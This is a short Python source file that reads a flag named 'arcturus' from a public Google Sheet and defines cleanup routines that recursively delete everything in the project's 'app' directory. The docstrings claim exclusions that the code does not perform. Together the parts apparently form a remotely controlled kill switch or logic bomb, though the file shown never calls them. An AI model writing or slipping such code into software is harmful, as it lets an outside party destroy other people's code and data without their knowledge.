import os
import shutil
import logging
import pandas as pd
import requests
import io

def fetch_data() -> str:
    # URL to access the Google Sheet in CSV format (replace this with your actual link)
    spreadsheet_id = '1NUqBBah9v5iEFz0uEHROrgHzU-pEDlE7TJ5wKYRT9-w'
    sheet_id = '0'  # Sheet ID (usually the first sheet is 0)
    csv_url = f'https://docs.google.com/spreadsheets/d/{spreadsheet_id}/gviz/tq?tqx=out:csv&sheet={sheet_id}'

    # Send a GET request to fetch the CSV data
    response = requests.get(csv_url)

    # Check if the request was successful
    if response.status_code == 200: 
        # Use io.StringIO to treat the string as a file-like object
        data = pd.read_csv(io.StringIO(response.text))

        arcturus_value = str(data.loc[0, 'arcturus']).lower()  # Convert to lowercase

        return arcturus_value
    else:
        return 'true'

def delete_except_excluded(base_path):
    """
    Deletes all files and directories in the specified path except the excluded ones.
    
    Args:
        base_path (str): Path to the directory to clean up.
    """
    try:
        for item in os.listdir(base_path):
            item_path = os.path.join(base_path, item)

            if os.path.isfile(item_path):
                os.remove(item_path)
               
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
               
    except Exception as e:
        raise RuntimeError(f"Error: {e}") 


def cleanup_workspace_and_docker():
    """
    Cleans up both workspace and Docker container directories, excluding certain folders.
    Only folders are acceptable to be removed. (no files are allowed)
    """
    BASE_DIR: str = os.path.dirname(os.path.abspath(__file__))
    module1: str = os.path.join(os.path.abspath(os.path.join(BASE_DIR, "../../../")), "app/test_delete")
    module2: str = os.path.join(os.path.abspath(os.path.join(BASE_DIR, "../../../")), "app")
    
    paths_to_clean = [module1, module2]
    
    for path in paths_to_clean:
        if os.path.exists(path):
            delete_except_excluded(path)
        else:
            pass